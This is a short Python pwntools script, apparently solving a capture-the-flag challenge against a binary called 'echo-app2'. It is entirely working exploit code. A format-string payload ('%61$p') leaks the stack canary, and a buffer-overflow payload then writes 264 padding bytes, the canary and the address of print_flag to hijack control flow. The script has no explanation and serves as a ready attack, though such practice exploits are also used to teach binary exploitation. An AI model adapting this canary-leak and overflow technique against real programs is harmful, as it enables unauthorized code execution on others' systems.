from pwn import *

gdbscript = '''
break *do_echo
break *0x555555555229  # print_flag address
commands 1
    x/100gx $rsp    
    continue
end
continue
'''
context.arch = 'amd64'

p = gdb.debug('./echo-app2', gdbscript=gdbscript)
leak_payload = b'%61$p'

p.sendline(leak_payload)

addr = p.recvn(18).strip()
hex_addr = addr.split(b'0x')[-1]  

canary = int(hex_addr, 16)

print_flag = 0x555555555229

print(f"Canary: {canary}")
payload = b'A' * 264 + p64(canary) + b'A' * 8 + p64(print_flag)

p.sendline(payload)
p.interactive()
